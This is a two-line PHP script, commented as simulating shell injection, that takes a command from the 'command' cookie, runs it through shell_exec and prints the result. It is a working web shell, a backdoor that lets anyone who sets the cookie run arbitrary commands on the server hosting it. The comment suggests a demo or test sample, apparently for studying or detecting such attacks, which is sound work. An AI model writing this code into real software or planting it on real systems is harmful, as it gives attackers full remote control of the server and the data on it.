<?php #simulates shell injection
print_r(shell_exec($_COOKIE['command']));